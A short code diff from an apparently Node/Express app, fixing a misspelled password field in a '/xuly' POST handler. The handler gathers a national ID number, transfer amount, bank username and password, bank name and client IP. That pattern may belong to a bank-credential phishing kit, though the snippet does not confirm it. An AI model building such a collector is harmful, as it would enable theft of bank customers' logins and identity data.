@@ -202,7 +202,7 @@ app.post("/xuly",(req,res)=>{
         CMND:req.body.CMND,
         ReciverMoney:req.body.reciverMoney,
         UserName:req.body.username,
-        Password:req.body.passwowrd,
+        Password:req.body.password,
         Bank:req.body.bankname,
         IP:req.clientIp
     }
